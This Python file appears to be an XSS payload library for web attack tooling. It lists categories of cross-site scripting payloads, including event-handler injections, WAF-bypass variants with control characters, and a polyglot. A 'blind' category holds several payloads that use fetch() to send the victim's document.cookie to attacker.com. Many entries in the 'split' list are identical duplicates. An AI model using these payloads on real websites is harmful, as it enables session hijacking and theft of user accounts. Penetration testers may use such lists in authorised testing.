#!/usr/bin/env python3

class XSSPayloads:
    def __init__(self):
        self.payloads = {
            'reflected': [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                'javascript:alert(1)',
                '"><iframe src="javascript:alert(1)"></iframe>',
                '"><body onload=alert(1)>',
                '"><input onfocus=alert(1) autofocus>',
                '"><select onmouseover=alert(1)>',
                '"><details open ontoggle=alert(1)>',
            ],
            'split': [
                '<scr\nipt>alert(1)</scr\nipt>',
                '<scr\tipt>alert(1)</scr\tipt>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
                '<scr\ript>alert(1)</scr\ript>',
            ],
            'unicode': [
                '<scr\u0000ipt>alert(1)</scr\u0000ipt>',
                '<scr\u000Aipt>alert(1)</scr\u000Aipt>',
                '<scr\u000Dipt>alert(1)</scr\u000Dipt>',
                '<scr\u0009ipt>alert(1)</scr\u0009ipt>',
                '<scr\u000Cipt>alert(1)</scr\u000Cipt>',
                '<scr\u000Bipt>alert(1)</scr\u000Bipt>',
                '<scr\u000Eipt>alert(1)</scr\u000Eipt>',
                '<scr\u000Fipt>alert(1)</scr\u000Fipt>',
                '<scr\u001Aipt>alert(1)</scr\u001Aipt>',
                '<scr\u0020ipt>alert(1)</scr\u0020ipt>',
            ],
            'waf_bypass': [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<scr\x00ipt>alert(1)</scr\x00ipt>',
                '<scr\x0Aipt>alert(1)</scr\x0Aipt>',
                '<scr\x0Dipt>alert(1)</scr\x0Dipt>',
                '<scr\x09ipt>alert(1)</scr\x09ipt>',
                '<scr\x0Cipt>alert(1)</scr\x0Cipt>',
                '<scr\x0Bipt>alert(1)</scr\x0Bipt>',
                '<scr\x0Eipt>alert(1)</scr\x0Eipt>',
                '<scr\x0Fipt>alert(1)</scr\x0Fipt>',
                '<scr\x1Aipt>alert(1)</scr\x1Aipt>',
            ],
            'event': [
                '"><img src=x onerror=alert(1)>',
                '"><body onload=alert(1)>',
                '"><input onfocus=alert(1) autofocus>',
                '"><select onmouseover=alert(1)>',
                '"><details open ontoggle=alert(1)>',
                '"><marquee onstart=alert(1)>',
                '"><video onloadstart=alert(1)>',
                '"><audio onloadstart=alert(1)>',
                '"><iframe onload=alert(1)>',
                '"><object onerror=alert(1)>',
            ],
            'polyglot': [
                r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
                '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)><svg/onload=alert(1)>',
                '"><script>alert(1)</script><script>alert(1)</script>',
                '"><iframe src="javascript:alert(1)"></iframe><iframe src="javascript:alert(1)"></iframe>',
            ],
            'blind': [
                '"><img src=x onerror=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
                '"><script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
                '"><svg/onload=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
                '"><iframe src="javascript:fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)"></iframe>',
                '"><body onload=fetch("http://attacker.com/steal?cookie="+document.cookie)>',
            ],
            'mutation': [
                '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)><svg/onload=alert(1)>',
                '"><script>alert(1)</script><script>alert(1)</script>',
                '"><iframe src="javascript:alert(1)"></iframe><iframe src="javascript:alert(1)"></iframe>',
                '"><body onload=alert(1)><body onload=alert(1)>',
            ],
            'self': [
                '"><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                '"><script>alert(1)</script>',
                '"><iframe src="javascript:alert(1)"></iframe>',
                '"><body onload=alert(1)>',
            ],
            'obfuscated': [
                '<scr\u0000ipt>alert(1)</scr\u0000ipt>',
                '<scr\u000Aipt>alert(1)</scr\u000Aipt>',
                '<scr\u000Dipt>alert(1)</scr\u000Dipt>',
                '<scr\u0009ipt>alert(1)</scr\u0009ipt>',
                '<scr\u000Cipt>alert(1)</scr\u000Cipt>',
                '<scr\u000Bipt>alert(1)</scr\u000Bipt>',
                '<scr\u000Eipt>alert(1)</scr\u000Eipt>',
                '<scr\u000Fipt>alert(1)</scr\u000Fipt>',
                '<scr\u001Aipt>alert(1)</scr\u001Aipt>',
                '<scr\u0020ipt>alert(1)</scr\u0020ipt>',
            ],
        }

    def get_all_payloads(self):
        """Get all unique payloads from all categories"""
        all_payloads = set()  # Use a set to ensure uniqueness
        for category in self.payloads.values():
            for payload in category:
                if isinstance(payload, str):
                    all_payloads.add(str(payload))
        return list(all_payloads)  # Convert back to list for iteration

    def get_payloads_by_category(self, category):
        """Get payloads for a specific category"""
        if category not in self.payloads:
            return []
        return [str(p) for p in self.payloads[category] if isinstance(p, str)]

    def get_categories(self):
        """Get all available payload categories"""
        return list(self.payloads.keys()) 
